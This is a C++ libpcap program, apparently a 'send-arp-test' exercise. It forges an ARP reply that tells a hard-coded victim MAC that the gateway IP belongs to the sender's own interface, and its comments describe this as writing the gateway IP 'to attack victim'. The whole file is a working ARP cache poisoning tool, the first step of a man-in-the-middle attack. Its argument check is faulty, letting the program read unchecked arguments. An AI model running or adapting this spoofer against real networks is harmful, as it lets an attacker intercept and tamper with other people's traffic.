#include <cstdio>
#include <pcap.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#define MAC_ALEN 6

#define MAC_ADDR_FMT "%02X:%02X:%02X:%02X:%02X:%02X"
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1],addr[2],addr[3],addr[4],addr[5]

#pragma pack(push, 1)
struct EthArpPacket final {
   EthHdr eth_;
   ArpHdr arp_;
};
#pragma pack(pop)

// get mac addr from interface
void GetInterfaceMacAddress(char* interface, unsigned char* mac) 
{
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET,SOCK_DGRAM,0);

    strncpy(ifr.ifr_name,interface,IFNAMSIZ -1);

    if(ioctl(fd,SIOCGIFHWADDR,&ifr) < 0) 
    {
        printf("ioctl error\n");
        close(fd);
        return;
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    close(fd);
}

void usage() {
   printf("syntax: send-arp-test <interface>\n");
   printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
   if (argc != 0 & argc %2 != 0) {
      usage();
      return -1;
   }

   /* get eth0 to argv */
   char* dev = argv[1];
   char* sender_IP = argv[2];
   char* target_IP = argv[3];
   
   const char *ifname = dev;
   uint8_t mac_addr[MAC_ALEN];
   unsigned char mac[6];

   /* # Read&Store mac address */ 
   GetInterfaceMacAddress(dev,mac);
   char buffer[18];
    sprintf(buffer, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    printf("MAC address is %s\n", buffer);

   char errbuf[PCAP_ERRBUF_SIZE];
   pcap_t* handle = pcap_open_live(dev, 1, 1, 1, errbuf);
   if (handle == nullptr) {
      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
      return -1;
   }

   EthArpPacket packet;
   // victim addr
   packet.eth_.dmac_ = Mac("a0:78:17:89:65:4c");
   // my mac addr
   packet.eth_.smac_ = Mac(buffer);
   packet.eth_.type_ = htons(EthHdr::Arp);

   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
   packet.arp_.pro_ = htons(EthHdr::Ip4);
   packet.arp_.hln_ = Mac::SIZE;
   packet.arp_.pln_ = Ip::SIZE;
   packet.arp_.op_ = htons(ArpHdr::Reply);

   /********************************************************/
   // my addr
   packet.arp_.smac_ = Mac(buffer);

   // write gateway ip to attack victim
   // In this situation, Victim is gateway
   packet.arp_.sip_ = htonl(Ip(target_IP));


   packet.arp_.tmac_ = Mac("a0:78:17:89:65:4c");
   packet.arp_.tip_ = htonl(Ip(sender_IP));

   /********************************************************/

   int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
   if (res != 0) {
      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
   }

   pcap_close(handle);
}